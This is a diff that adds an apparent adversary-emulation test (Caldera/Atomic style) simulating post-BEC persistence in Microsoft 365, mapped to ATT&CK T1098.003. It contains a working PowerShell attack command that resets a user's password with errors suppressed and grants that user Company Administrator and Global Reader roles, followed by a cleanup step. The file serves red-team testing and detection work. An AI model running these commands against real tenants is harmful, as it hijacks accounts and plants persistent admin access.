@@ -1,0 +1,35 @@
+---
+- id: 300411e901bb14245148885ad5e72882
+  name: Simulate - Post BEC persistence via user password reset followed by user added
+    to company administrator role
+  description: "This test looks at simulating the an adversary described in the following\
+    \ blog post. It involves resetting the password of a normal user and adding to\
+    \ the company administrator role within M365.\n Reference: https://www.huntress.com/blog/business-email-compromise-via-azure-administrative-privileges\n"
+  tactic: multiple
+  technique:
+    attack_id: T1098.003
+    name: 'Account Manipulation: Additional Cloud Roles'
+  platforms:
+    unknown:
+      psh:
+        command: Import-Module MSOnline; Import-Module AzureAD; $password = ConvertTo-SecureString
+          -String "p4sswd" -AsPlainText -Force; $credential = New-Object -TypeName
+          System.Management.Automation.PSCredential -ArgumentList "jonh@contoso.com",
+          $password; $targetsecurepw = ConvertTo-SecureString -String "Ohn05GeMe#$"
+          -AsPlainText -Force; Connect-MsolService -Credential $credential -ErrorAction:SilentlyContinue;
+          Connect-AzureAD -Credential $credential -ErrorAction:SilentlyContinue; $target_objid
+          = Get-AzureADUser -filter "userPrincipalName eq 'default'" | Select-Object
+          -ExpandProperty ObjectId; Set-AzureADUserPassword -ObjectId  $target_objid
+          -Password $targetsecurepw -ErrorAction:SilentlyContinue; Add-MsolRoleMember
+          -RoleName "Company Administrator" -RoleMemberEmailAddress "default"; Add-MsolRoleMember
+          -RoleName "Global Reader" -RoleMemberEmailAddress "default"
+        payloads: []
+        cleanup: Import-Module MSOnline; $password = ConvertTo-SecureString -String
+          "p4sswd" -AsPlainText -Force; $credential = New-Object -TypeName System.Management.Automation.PSCredential
+          -ArgumentList "jonh@contoso.com", $password; Connect-MsolService -Credential
+          $credential; Remove-MsolRoleMember -RoleName "Company Administrator" -RoleMemberType
+          User -RoleMemberEmailAddress "default"; Remove-MsolRoleMember -RoleName
+          "Global Reader" -RoleMemberType User -RoleMemberEmailAddress "default"
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
